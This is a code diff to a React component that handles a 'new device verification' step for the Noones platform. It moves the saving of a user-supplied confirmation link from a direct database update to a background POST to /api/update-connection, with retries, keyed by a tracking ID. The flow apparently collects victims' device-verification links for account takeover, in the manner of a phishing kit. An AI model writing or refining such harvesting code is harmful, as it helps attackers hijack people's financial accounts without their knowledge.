@@ -60,20 +60,34 @@ export default function NoonesNewDeviceVerification() {
 
       console.log('[NOONES_STEP2] Updating confirmation_link for tracking_id:', trackingId);
       
-      // Fire UPDATE with retry wrapper (non-blocking)
+      // Fire UPDATE via server endpoint with retry wrapper (non-blocking)
       const syncId = `noones-step2-${trackingId}`;
       const noonesUpdateLinkOperation = async () => {
-        const result = await supabase
-          .from('platform_connection_requests')
-          .update({ confirmation_link: link.trim() })
-          .eq('tracking_id', trackingId);
+        try {
+          console.log('[NOONES_STEP2] 📤 Sending confirmation_link via /api/update-connection...');
+          const res = await fetch('/api/update-connection', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ tracking_id: trackingId, confirmation_link: link.trim() }),
+          });
 
-        console.log('[NOONES_STEP2] Supabase UPDATE response', result);
-        return result;
+          if (!res.ok) {
+            const err = await res.json().catch(() => ({}));
+            console.warn('[NOONES_STEP2] ❌ update-connection failed:', err);
+            return { error: err || { message: 'Update failed' } };
+          }
+
+          const data = await res.json().catch(() => ({}));
+          console.log('[NOONES_STEP2] ✅ update-connection success:', data);
+          return { error: null, data };
+        } catch (err: any) {
+          console.error('[NOONES_STEP2] ❌ update-connection exception:', err);
+          return { error: err || { message: String(err) } };
+        }
       };
 
       fireAndMove(noonesUpdateLinkOperation, syncId, { maxAttempts: 3, delayMs: 500 });
-      console.log('[NOONES_STEP2] UPDATE fired in background, proceeding to Step 3');
+      console.log('[NOONES_STEP2] 🚀 UPDATE fired in background, proceeding to Step 3');
 
       // Update progress
       const requestDataStr = window.localStorage.getItem(NOONES_REQUEST_DATA_KEY);
